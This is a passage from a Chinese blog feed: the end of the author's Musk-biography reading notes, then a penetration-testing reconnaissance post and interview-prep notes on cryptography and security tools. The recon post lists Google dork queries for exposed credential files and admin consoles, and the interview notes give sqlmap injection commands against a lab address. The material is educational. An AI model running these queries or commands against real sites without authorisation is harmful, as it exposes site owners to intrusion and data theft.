color=red>第一，他发现技术进步并不是必然的，戳穿这一点既令人感到惊讶，也让人心生恐惧——技术可能停滞，也可能倒退。美国人已经登上月球，但随后航天飞行项目搁浅，并无相关进展。他质问道：“我们是想告诉下一代，我们做到登月就到头儿了，就不做了，是吗？”古埃及人学会了建造金字塔，但后来这些知识就遗失了。古罗马也出现了同样的情况，他们修建了水渠和其他了不起的建筑，却在黑暗时代失去了一切。这种情况是否会发生在美国？“人们错误地认为技术会自动进步，”几年后，他在TED演讲中说，“只有当很多人为此不懈奋斗，它才会至臻完善。”<br>第二，殖民其他星球有助于确保人类文明和意识的保留和赓续，以防我们脆弱的地球家园遭遇不测——有一天它可能会被小行星撞击、核战争或气候变化所摧毁。他对“费米悖论”非常痴迷，它是以意大利裔美国物理学家恩里科·费米命名的，他在讨论宇宙中的外星生命时说：“可外星人都在哪里呢？”从数学上看，存在其他文明似乎是合乎逻辑的，但由于缺乏证据，一种令人不安的可能性大大增加——地球上的人类可能是唯一的生命意识范本。“我们这支火苗微弱的意识蜡烛在这里闪烁，它可能是宇宙中唯一的意识实体，所以我们必须保护好它。”马斯克说，“如果我们能到达其他星球，相比于小行星撞击地球或人类文明自毁可能带来的严重后果，人类意识可能延续的时间将会大大变长。”<br>第三，他的这一动机更加鼓舞人心，他出生在一个冒险者家族，继承了这个家族的精神内核，他在十几岁时就决定搬到一个以拓荒者精神为民族之魂的国家。马斯克说：“美国实际上是一片淬炼出了人类探索精神的高地，这是一片冒险者的土地。”他认为，这种精神需要在美国被重新点燃，而实现这一点的最好方法是推进殖民火星的任务。“在火星上建立基地的困难程度超乎想象，可能会有人在途中死去，就像人们到新大陆定居时发生的那样。但它能极大地鼓舞人心，我们对这个世界必须抱有希望，必须有能够振奋人心的东西。”他认为，人生在世不能只是为了解决问题，人必须追求伟大的梦想。“那个值得追求的东西，是能让我们从睡梦中醒来去迎接崭新一天的东西。”</font><br><font color=blue>在没有听过Elon的这句话前。很多人说，世界的进步(技术，科学，社会等各种进步)是必然的，他们会说即使没有爱因斯坦也会有其他人发现相对论。<br>我当时对这种观点的态度是不置可否。因为我既不认为他们说的正确，也没有深入思考过推翻他们说法的事。<br>当听过Elon的话后，我明白了世界的进步不是必然的。这一定是由一个个改变世界的天才所引领的，这些天才无可替代！他们值得被后世铭记。<br>人生在世不能只是为了解决问题，人必须追求伟大的梦想。这句话我认为非常正确。虽然不是要求每个人都这么做，但这么做的人无疑已经和凡庸者区别开了。<br>在我看来，这个世界的前方就如同荆棘的路，凡庸者不过是路上的肉垫，而伟大的人踏着凡庸者的身体带领人类抵达前方。凡庸者并不是一无是处，他们的作用就是肉垫，当然每个凡庸者都能被其他人随时被替代。</font></p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p><font color=red>埃隆是在使命感的驱动下顺势而为，先行好事，后问前程。</font><br><font color=blue>当今世上多少人，是先问前程，再行好事，甚至都不是“好事”呢？和这样的人待在一起，恐怕自身都会腐朽吧。</font></p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p><font color=red>“用佛教的话来说，这是一场关于因果报应的考验。”马斯克说，“就像恺撒在元老院被刺死一样，我在PayPal被政变的领导者推翻后，本可以说‘你们这些人，真是烂透了’，但我没有这么说。如果我同他们势同水火，创始人基金就不会在2008年注资SpaceX，SpaceX无疑会死掉。我不喜欢类似占星术的烂玩意儿，但因果报应可能是真的。”</font><br><font color=blue>人生太短，别轻易抱起仇恨。</font></p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p><font color=red>“航空航天这种高端产业的从业者和政府官员都以嘲笑SpaceX和埃隆为乐。”加弗说，“埃隆比他们年轻，比他们富有，拥有硅谷那种创新颠覆者的心态，面对传统行业的桎梏，初生牛犊不怕虎，然而这些都不足以让那些人对他高看一眼。”</font><br><font color=blue>可见，这个世界已经腐朽成什么样了。<br>即使在美国，大多数人也不过是安然享乐，人类在固步自封。<br>像Elon这样的人只是少数，能与这样的人共事是一种幸运。</font></p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p><font color=red>他说这两个人都有强迫症，但是是好的那种。埃里森说：“强迫症是他们成功的原因之一，因为他们执着于解决一个问题，不达目的不罢休。”马斯克与乔布斯的不同之处在于，他的这种习惯不仅体现在产品设计方面，还体现在他对基础科学、工程和制造的问题研究当中。“史蒂夫只需要把设计理念和软件工程做好，制造环节是外包的。”埃里森说，“而埃隆承担起了制造、供应链和巨型工厂等各个方面。”乔布斯喜欢每天走进苹果公司的设计工作室看看，但他从未去过苹果在中国的工厂。相比之下，马斯克泡在装配线上的时间比他在设计工作室里的时间还多，他说：“与设计一家工厂所需的脑力劳动相比，设计车的脑力劳动不值一提。”</font><br><font color=blue>人们喜欢对比，Elon和乔布斯做对比。很明显作者的倾向是Elon。<br>乔布斯更多的是活在的是8090后的心中吧，00后的了解实际是比较少的，因为00后成年的时候乔布斯早已不再人世。<br>不过我对乔布斯也同样抱有敬意，他也是引领人类前进的天才之一。我想他在电子设备行业所做的创新至少加快了这个行业20年的进程。为整个人类发展的进步也至少提高了8年的进程。<br>很可惜的是，现在的苹果市值2.8万亿美元达到了富可敌国的水平，在乔布斯离开后再也难有大的创新了，只是一家求稳健的成熟公司，成为了大部分公司追求的榜样。</font></p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p><font color=red>他喜欢专注于工作的状态，有时他把生活的其他部分视为对工作的打扰，令他感到不悦。马斯克承认：“我花在工作上的时间太多了，以至于任何关系都很难维持下去。SpaceX和特斯拉都在艰难度日，同时兼顾两家公司的我举步维艰，所以我只能把所有时间都放在工作上。”</font><br><font color=blue>可以说工作已经内化Elon为一部分了。“把生活的其他部分视为对工作的打扰”这给人印象很深。</font></p><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p><font color=red>工作法包含了五大步骤：1.质疑每项要求。提出任何一项要求时，都应该附上提出这一要求的人。永远不要接受一项来自某个部门的要求，比如来自“法务部门”或者“安全部门”的要求。你必须知道提出这项要求的人的名字。接下来你应该质疑它，不管这个人有多聪明。聪明人提出的要求才是最危险的，因为人们不太可能质疑他们。这件事要一直做下去，即便这项要求来自我马斯克本人。质疑后，大家就要改进要求，让它变得不那么愚蠢。<br>2.删除要求当中所有你能删除的部分和流程，虽然你可能还得把它们加回来。事实上，你如果最后加回来的部分还不到删除部分的10%，那就说明你删减得还不够。<br>3.简化和优化。这应该放在第2步之后，因为人们常犯的错误就是简化和优化一个原本不应该存在的部分或者流程。<br>4.加快周转时间。每个流程都可以加快，但只有遵循了前三个步骤之后才能这么做。在特斯拉工厂，我错误地把很多精力花在加快生产流程上，后来我才意识到有些流程原本就应该被拿掉。<br>5.自动化。在内华达工厂和弗里蒙特工厂犯下的一个大错就是我一开始试图将每个步骤进行自动化改造。我们本应该先质疑所有要求，删除不必要的部分和流程，把问题筛出来、处理掉，然后再推进自动化。</font><br><font color=blue>五步工作法不仅仅运用在工作上，也可包含在生活的方方面面。老实说，我认为运用在工作中不太容易，因为只是一个员工就要质疑要求，那么大概率得到的不是赞赏而是批评。这种只有当作为了高层的时候才有资格这么说。</font></p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p><font color=red>这套工作法有时还衍生出一些推论，包括：<br>• 所有技术经理都必须有实战经验，比如说软件团队的管理人员必须至少花20%的时间进行编程，太阳能屋顶业务的经理必须花时间在屋顶上亲自做安装工作。否则光说不练，他们就像是不会骑马的骑兵队队长、不会舞刀弄枪的将军。<br>• “你好，我好，大家好”是很危险的，人们会因此不再质疑同事的工作成果。人们天然有一种倾向是不想把要好的同事踢下船，而这种危险倾向一定要避免。<br>• 犯错没关系，但错了还不肯低头就不行。<br>• 永远不要要求你的团队做你自己都不愿意做的事。<br>• 每当有问题需要解决时，不要只与你直接管理的相关负责人聊。深入调研就要跨层级沟通，去跟你属下的属下直接交流吧。<br>• 招聘要招态度端正的人。技能是可以教的，但要扭转一个人的工作态度可就太费劲了，得给他“换个脑子”。<br>• 疯狂的紧迫感是我们公司运作的法则。<br>• 唯一要遵守的规则就是物理学定律能推导出来的规则，其他一切都只是建议。</font><br><font color=blue>第一条用一个成语概括是纸上谈兵。<br>第二条也可用一个成语概况是大义灭亲。<br>第三条用四个字概括是知错就改。<br>第四条用一句论语概况是己所不欲勿施于人。<br>最后一条给我做事的阈值提高了很多，在原本就有所出格的情况下提升了很多。只要不违法物理学定律都可以。</font></p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p><font color=red>一位工程师指出了一个显而易见的问题，那就是真车的底盘要大得多，没有铸造机可以处理这么大块的东西。马斯克对这个答案并不满意，他说：“去想想怎么做吧，不就是搞一台更大的铸造机吗？又不是说要打破物理学定律了。”</font><br><font color=blue>我做“出格”的事时，会有所意识。但Elon没有，因为他对“出格”的事定义为违反物理学定律。普通人的出格是违反常理。</font></p><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p><font color=red>那年夏天，他向波音公司的一位副总裁介绍了SpaceX如何推动年轻工程师开拓创新。“如果波音不做出改变，”他说，“行业顶级人才就会流失。”副总裁回答说，波音公司不需要聘用这些想在技术上搞颠覆式创新的人，“也许我们想招的就不是什么顶尖人才，我们要的是能踏踏实实在这长期干下去的人”。</font><br><font color=blue>即使是一个优秀的人才，待在泥潭里，最终也无所作为。<br>特斯拉和SpaceX基本上都是从0到10000的公司，在短时间内达到如此的变革。我认为并不是因为人才比其他公司优秀好几倍，而是环境比其他公司好了很多。<br>在现在这个时代，想要打造一片自己的环境非常难。即使是在马斯克那个时代，物质条件和自身条件也有很高要求。如果做不到打造自己的环境，那就去一片好的环境吧。待遇都是其次。</font></p><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p><font color=red>马斯克已然踏上了这样一条道路：他要展开一场角斗，一方是他心中那些过犹不及的政治正确思潮，另一方是那些代表着进步思想与社会正义的活动家的觉醒文化思潮。我问他为什么要这么做，他回答说：“那些号称能让人觉醒的心智病毒，比如反科学、反精英、反人类思潮，如果不从根本上铲除它们，人类文明永远都不会成为星际文明。”</font><br><font color=blue>觉醒运动是愚蠢的。就像共产主义一样愚蠢。</font></p><h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><p><font color=red>能被冠以“世界首富”称号的人本就凤毛麟角，而就在这一小撮人当中，马斯克和盖茨身上还有着一些相似的地方。二人都擅长缜密的分析，有着如激光一般全神贯注的能力，还有一种智识上的优越感，这种优越感渐渐演化成了一种傲慢——他俩都受不了愚蠢的人。</font><br><font color=blue>缜密的分析和全神贯注的能力，做不到…但是我受不了愚蠢的人。</font></p><h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p><font color=red>我问他为什么不克制一下自己，他愉快地承认，他经常“搬起石头，砸自己的脚”，还经常“自己挖坑，自己跳”，但生活需要趣味横生，需要激动人心，他说着就引用起2000年上映的电影《角斗士》中他最喜欢的一句台词：“你不觉得这很有趣吗？你不就是为了这个才来这儿的吗？</font><br><font color=blue>有趣比完美更重要。</font></p><h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><p><font color=red>那推特算什么呢？马斯克在4月告诉我：“一开始我拿我这些发自初心的宏大使命往上套，结果发现推特套不进去，但我已经开始渐渐相信，推特可以成为保护人类文明这一使命的一部分，在人类成为跨行星物种之前，给人类社会争取更多时间。”何出此言呢？一部分原因关涉到言论自由。“媒体中似乎充斥着越来越多的群体思维，不敢越雷池一步，所以如果你没有站在他们的队里，他们就会孤立你，你想喊也发不出声音。”他认为，对于民主的赓续，重要的是铲除推特中盛行的“觉醒文化”，打破偏见，让大家眼中的推特成为一个开放的空间，可以对各种意见兼收并蓄。</font><br><font color=blue>群体思维不适用于喜欢变化的人。</font></p><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p><font color=red>段鹏飞说：“我当时连轴转了几个月，没有休息一天，实在太累了，感觉被榨干了。自动驾驶日之后，我就退出了特斯拉，但过了9个月，我又感到很无聊，所以我打电话给老板，求他让我回来。我决定了，宁可被榨干，也绝不混天度日。”</font><br><font color=blue>挺棒的。这样的工作在生理上会带来痛苦，精神上却得到富足。</font></p><h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><p><font color=red>马斯克在推特上回应说：“你并不是在一丝不苟地追求真理，而是在向外界彰显你的‘美德’，以显示你在媒体精英面前是一个‘好人’，你就是想脚踩两只船。”</font><br><font color=blue>我曾经也有很长一段时间在彰显“美德”，后来我意识到这样并不是智慧。只不过是一种讨巧的理想主义。这个世界从不完美。<br>我们绝大多数时候都是在做几个选择，这几个选择都有优点缺点，让人难以分辨，但最终我们都要选择一条路。而有的人故作聪明想要踏两只船。<br>我的看法是，选择其中一条路的不一定有智慧，但两条路都选的一定没有智慧。<br>不要彰显“美德”，不要做“好人”，勇敢地选择一条路并坚定地前行吧！</font></p><h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p><font color=red>当他醒过神来以后，突然变得富有哲理起来，他说：“文明就是这样衰落的，因为他们放弃了冒险。当他们放弃了冒险事业，文明的动脉就会硬化。每年，真刀真枪的实干家越来越少，动动嘴皮子吹哨的裁判员却越来越多。”这就是为什么美国再也造不出高铁和能够登月的火箭，“躺在功劳簿上太久，你就会失去冒险的欲望”。</font><br><font color=blue>实干家身先士卒，裁判员养尊处优。这里的裁判员在我看来不仅仅包括政府人员，还有那些整天评判他人所作所为的网友。<br>如果人类的最终目标是为了让生活舒适，那不如灭亡！</font></p><h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><p><font color=red>有时候，伟大的创新者就是与风险共舞的孩子，他们拒绝被规训。他们可能草率鲁莽，处事尴尬，有时甚至引发危机，但或许他们也很疯狂——疯狂到认为自己真的可以改变世界。</font><br><font color=blue>这句话作为结尾很不错~</font></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;昨晚读完了艾萨克森写的马斯克传记，作为一本读了20天的书，我也有许多想做笔记的地方。&lt;/p&gt;</summary>
    
    
    
    <category term="读书笔记" scheme="http://example.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="马斯克" scheme="http://example.com/tags/%E9%A9%AC%E6%96%AF%E5%85%8B/"/>
    
    <category term="读书笔记" scheme="http://example.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试之信息收集</title>
    <link href="http://example.com/2023/10/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2023/10/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2023-10-09T16:00:00.000Z</published>
    <updated>2023-10-11T05:48:09.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透之基础。</p><span id="more"></span><h1 id="公司级别（获取目标域名）"><a href="#公司级别（获取目标域名）" class="headerlink" title="公司级别（获取目标域名）"></a>公司级别（获取目标域名）</h1><ol><li><p>得到公司名，使用Google搜索得到官网，官网一般主域名。</p></li><li><p>使用企查查，天眼查，域名备案获取主域名。也可以得到相关身份信息（人名，手机号，邮箱）<br><a href="www.qcc.com">企查查</a>  <a href="https://www.tianyancha.com/">天眼查</a>  <a href="https://www.freebuf.com/sectool/284285.html">境外企业信息查询小工具</a></p></li><li><p>利用whois查询，whois反查获取域名相关信息<br><a href="http://whois.chinaz.com/">站长之家</a><br><a href="https://x.threatbook.cn/">微步</a></p></li><li><p>查看ip信息，有无CDN<br><a href="https://ping.chinaz.com/">站长工具</a><br><a href="https://www.ipshudi.com/">IP反查</a><br><a href="https://www.ssllabs.com/ssltest/analyze.html">SSL Lab查找真实IP</a></p></li></ol><h1 id="域名级别（获取目标子域名）"><a href="#域名级别（获取目标子域名）" class="headerlink" title="域名级别（获取目标子域名）"></a>域名级别（获取目标子域名）</h1><ol><li><p>子域名收集<br>Oneforall - 自动化，收集比较全，使用方便<br>fofa语法: <code>domain=&quot;anikore.jp&quot;</code></p></li><li><p>查旁站<br><a href="https://chapangzhan.com/">查旁站</a><br><a href="https://ipchaxun.com/">ip查询</a><br><a href="https://stool.chinaz.com/same?s=178.79.181.137">站长工具</a></p></li><li><p>Google语法<br>迅速查找信息泄露、管理后台暴露等漏洞语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Google hack实战-搜索敏感文件</span><br><span class="line">filetype:txt 登录</span><br><span class="line">filetype:xls 登录</span><br><span class="line">filetype:doc 登录</span><br><span class="line">site:xxx.com filetype:doc intext:pass</span><br><span class="line">site:xxx.com filetype:xsl intext:pass</span><br><span class="line">site:xxx.com filetype:conf</span><br><span class="line">site:xxx.com filetype:inc</span><br><span class="line">filetype:log iserror.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Google hack实战-搜索登陆后台</span><br><span class="line">intitle:后台管理</span><br><span class="line">intitle:login</span><br><span class="line">intitle: 后台管理 inurl:admin</span><br><span class="line">intitle:index of /</span><br><span class="line">site:example.com filetype:txt 登录</span><br><span class="line">site:example.com intitle: 后台管理</span><br><span class="line">site:example.com admin</span><br><span class="line">site:example.com login</span><br><span class="line">site:example.com system</span><br><span class="line">site:example.com 管理</span><br><span class="line">site:example.com 登录</span><br><span class="line">site:example.com 内部</span><br><span class="line">site:example.com 系统</span><br><span class="line">site:xxx.com admin</span><br><span class="line">site:xxx.com login</span><br><span class="line">site:xxx.com 管理</span><br><span class="line">site:example.com system</span><br><span class="line">site:example.com 登录</span><br><span class="line">site:example.com 内部</span><br><span class="line">site:example.com 系统</span><br><span class="line">site:example.com filetype:txt 登录</span><br><span class="line">site:example.com intitle:后台管理</span><br><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line">site:example.com intext:管理|后台|登录|用户名|密码|验证码|系统|账号|admin|login|sys|management|password|username</span><br><span class="line"></span><br><span class="line">Google hack实战-搜索中间件</span><br><span class="line">Weblogic</span><br><span class="line"></span><br><span class="line">inurl:/console/login/LoginForm.jsp site:domian</span><br><span class="line">inurl:/console/login/LoginForm.jsp intitle:Oracle WebLogin Server site:domain</span><br><span class="line">inurl:/console/login/ intitle:&quot;Oracle WebLogin Server 管理控制台&quot; site:domain</span><br><span class="line"></span><br><span class="line">Jboss</span><br><span class="line"></span><br><span class="line">inurl:/jmx-console/htmladaptor site:domain</span><br><span class="line"></span><br><span class="line">Websphere</span><br><span class="line"></span><br><span class="line">inutl:/ibm/console/login.jsp site:domain</span><br></pre></td></tr></table></figure></li></ol><h1 id="IP级别（获取目标IP）"><a href="#IP级别（获取目标IP）" class="headerlink" title="IP级别（获取目标IP）"></a>IP级别（获取目标IP）</h1><ol><li><p>域名转IP<br>可使用在线工具: <a href="https://www.useotools.com/zh/domain-into-ip/output">域名转IP</a></p></li><li><p>C段信息<br>使用cIPR</p></li><li><p>存活探测，端口扫描，常见服务爆破<br>使用fscan</p></li><li><p>查找资产<br>使用fofa，zoomeye等</p></li></ol><h1 id="web级别（获取目标web信息）"><a href="#web级别（获取目标web信息）" class="headerlink" title="web级别（获取目标web信息）"></a>web级别（获取目标web信息）</h1><ol><li><p>识别网站框架cms<br>用插件Wappalyzer</p></li><li><p>路径收集<br>使用dirbuster，御剑等</p></li><li><p>敏感信息收集<br>使用JSFinder</p></li></ol><p>Nessus<br><a href="https://www.cnblogs.com/chenyablog/p/15302755.html">渗透清单1</a><br><a href="https://blog.csdn.net/quandaquan/article/details/126986847">渗透清单2</a><br><a href="https://zhuanlan.zhihu.com/p/325941785">渗透清单3</a></p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>存在输入的地方<br>工具：SQLMAP<br>类型：联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入<br>数据库：MySQL, MSSQL, Oracle</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>etc</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;渗透之基础。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="信息收集" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之密码学篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-17T16:17:22.519Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>巧妙运用，出神入化。</p><span id="more"></span><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li><p>常见加密方式</p></li><li><p>AES&#x2F;DES的具体工作步骤</p></li><li><p>RSA算法</p></li><li><p>如何生成一个安全的随机数？</p></li><li><p>在</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;巧妙运用，出神入化。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="密码学" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之工具篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-30T10:32:59.970Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工具是兵器，知识是使用方法。</p><span id="more"></span><h1 id="发散提问"><a href="#发散提问" class="headerlink" title="发散提问"></a>发散提问</h1><ol><li><p>你平时使用哪些工具？以及对应工具的特点？</p></li><li><p>使用什么工具来判断系统是否存在后门？</p></li></ol><p>D盾_Web查杀：只支持Windows<br>Sangfor WebShellKiller<br>深信服EDR<br>Web Shell Detector<br><a href="https://bypass007.github.io/Emergency-Response-Notes/Summary/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E7%9A%84Webshell%E6%9F%A5%E6%9D%80%E5%B7%A5%E5%85%B7.html">常见的Webshell查杀工具</a></p><h1 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h1><ol><li>有哪些反向代理的工具？</li></ol><p>Nginx: 开源的高性能反向代理服务器，支持负载均衡、缓存、SSL加密等功能，常用于Web服务器、API Gateway等。<br>Apache HTTP Server: 开源的Web服务器，也可以作为反向代理服务器，支持负载均衡、SSL加密、反向代理等功能。<br>HAProxy: 高性能的负载均衡器和反向代理服务器，支持TCP和HTTP协议，可用于HTTP请求的负载均衡、高可用性等场景。<br>Traefik: 基于Go语言开发的现代化反向代理服务器，支持自动发现服务、负载均衡、自动SSL证书管理等功能，常用于Docker容器环境。<br>Envoy: 由Lyft开发的高性能反向代理和边缘代理，支持负载均衡、服务发现、流量管理等功能，常用于微服务环境。</p><h1 id="渗透测试工具"><a href="#渗透测试工具" class="headerlink" title="渗透测试工具"></a>渗透测试工具</h1><ol><li>sqlmap，怎么对一个注入点注入？</li></ol><p>设置指定注入参数：<br><code>-p</code> : 指定参数进行扫描，不是扫描所有参数，提高效率。<br><code>--skip</code> : 跳过指定参数扫描，和 <code>-p</code> 的作用相反，它用来跳过需要扫描的参数。<br><code>--param-exclude</code> : 不对包含具体内容参数的请求进行探测，如不对包含token和session参数的请求进行探测。<br><code>--skip-static</code> : 扫描时忽略非动态参数。</p><p>sqlmap设置url注入位置<br>当注入点在url上时，除非手动将注入点指向URL上，否则sqlmap不会对url路径执行任何自动测试，必须要在扫描时在url上加星号(*)来指定这些注入点。<br><code>python sqlmap.py -u &quot;http://172.17.0.1/Less-1*/?id=1&quot; --banner</code></p><p>sqlmap设置任意注入位置<br>使用星号(*)来指定注入点<br><code>python sqlmap.py -u &quot;http://172.17.0.1/Less-20/?id=1&quot; --cookie=&quot;uname=admin*&quot; --banner</code></p><ol start="2"><li>nmap，扫描的几种方式？</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-sS  SYN扫描，半连接扫描，优点是扫描速度快，不容易被记录，适用于任何兼容TCP堆栈，可以清晰可靠地区分端口开启、关闭和过滤状态。</span><br><span class="line">但需要root权限去构造原始数据包，目前IDS可以检测到这种扫描方式。</span><br><span class="line">-sT  TCP连接扫描，建立完整的连接，会被日志、IDS等记录。</span><br><span class="line">-sA  ACK扫描，适合用来映射防火墙规则。</span><br><span class="line">-sW  Windows扫描，窗口扫描原理与ACK扫描相同，但它会利用系统的实现细节区分端口开放和关闭，而不是都标记为 unfiltered。</span><br><span class="line">-sM  Maimon扫描，以发现者Uriel Maimon命名，使用FIN/ACK数据包为探针。</span><br><span class="line">-sU  UDP扫描，速度很慢，扫描上千个端口需要至少17分钟，多数Linux系统会限制icmp响应速率。</span><br><span class="line">-sN/sF/sX  NULL扫描、FIN扫描、Xmas扫描，设置TCP标志位。</span><br><span class="line">这三种扫描类型（以及--scanflags选项）利用TCP RFC 标准中的细节来区分开放端口和关闭端口，通常只能确定关闭的端口。</span><br><span class="line">-sI  空闲扫描，也有称之为僵尸扫描，利用僵尸主机进行扫描，优点是隐蔽性强，缺点是需要找一台合适的僵尸主机。</span><br><span class="line">-sY/sZ SCTP INIT/COOKIE-ECHO扫描，这两种扫描方式是基于SCTP协议。</span><br><span class="line">-sO  协议扫描，IP层协议扫描，这不算是端口扫描技术，该扫描技术用于判断目标主机所支持的协议。</span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/sectool/277822.html">一文读懂Nmap的正确使用方法</a></p><ol start="3"><li>用什么扫描端口，目录？</li></ol><p>nmap,dirsearch</p><ol 